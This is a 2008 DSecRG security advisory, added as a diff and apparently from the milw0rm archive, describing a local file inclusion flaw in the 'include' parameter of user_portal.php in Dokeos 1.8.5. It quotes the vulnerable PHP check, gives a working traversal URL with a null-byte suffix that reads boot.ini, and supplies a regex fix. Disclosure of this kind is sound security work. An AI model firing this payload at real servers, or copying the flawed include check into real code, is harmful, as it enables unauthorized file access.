@@ -1,0 +1,71 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-029
+
+
+Application:                    Dokeos E-Learning System
+Versions Affected:              1.8.5
+Vendor URL:                     http://dokeos.com/
+Bug:                            Local File Include
+Exploits:                       YES
+Reported:                       01.07.2008
+Vendor response:                05.07.2008
+Solution:                       YES
+Date of Public Advisory:        17.07.2008
+Authors:                        Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+Dokeos E-Learning System system has local file include vulnerability in script user_portal.php
+
+Vulnerable GET parameter "include".
+
+Registered user can use this vulnerability.
+
+Code
+****
+#################################################
+
+if (!empty ($_GET['include']) && !strstr($_GET['include'], '/') && strstr($_GET['include'], '.html'))
+{
+        include ('./home/'.$_GET['include']);
+        $pageIncluded = true;
+}
+else
+..
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/user_portal.php?include=..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.html
+
+
+Fix Information
+
+***************
+
+you can fix it following this official information http://www.dokeos.com/wiki/index.php/Security Or wait a new
+release
+
+
+Fixing this issue can be done by replacing line 770 of /user_portal.php by:
+
+ if (!empty ($_GET['include']) && preg_match('/^[a-zA-Z0-9_-]*\.html$/',$_GET['include']))
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and
+penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and
+PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with
+vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:    research [at] dsec [dot] ru
+            http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2008-07-28]
